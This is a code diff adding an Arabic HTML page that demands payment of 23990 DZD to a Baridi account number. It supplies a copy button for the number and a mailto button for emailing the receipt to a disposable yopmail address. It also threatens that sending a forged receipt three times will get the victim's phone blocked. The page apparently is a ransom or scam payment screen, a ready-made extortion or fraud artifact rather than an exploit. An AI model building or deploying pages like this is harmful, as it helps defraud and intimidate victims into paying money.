@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>يجب دفع المبلغ</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background-color: black;
+      font-family: Arial, sans-serif;
+      direction: rtl;
+      color: white;
+    }
+
+    .container {
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .box {
+      background-color: rgba(255, 255, 255, 0.03);
+      border: 1px solid white;
+      padding: 30px;
+      border-radius: 20px;
+      text-align: center;
+      box-shadow: 0 0 25px rgba(255, 255, 255, 0.2);
+    }
+
+    .box img {
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      margin-bottom: 15px;
+    }
+
+    .code {
+      margin: 15px 0;
+      font-size: 20px;
+      background-color: #222;
+      padding: 10px;
+      border-radius: 8px;
+      user-select: all;
+    }
+
+    .note {
+      margin-top: 15px;
+      font-size: 16px;
+      color: #ccc;
+    }
+
+    button {
+      margin-top: 20px;
+      background-color: #00ffcc;
+      color: black;
+      border: none;
+      padding: 12px 25px;
+      font-size: 18px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="box">
+      <img src="baridi.png" alt="Baridi Logo">
+      <div class="code" onclick="copyText(this)">00799999004332483575</div>
+      <h2>ادفع 23990 DZD</h2>
+
+      <button onclick="sendEmail()">أرسل وصل الدفع عبر Gmail</button>
+
+      <div class="note">إرسال وصل مزور3مرات سيؤدي إلى حظر هاتفك <strong></strong></div>
+    </div>
+  </div>
+
+  <script>
+    function copyText(element) {
+      navigator.clipboard.writeText(element.innerText);
+      alert("تم نسخ رقم الدفع!");
+    }
+
+    function sendEmail() {
+      window.location.href = "mailto:g_live@yopmail.com?subject=تأكيد%20دفع&body=أرفقت%20وصل%20عملية%20الدفع%20لقيمة%2023990%20DZD.";
+    }
+  </script>
+
+</body>
+</html>
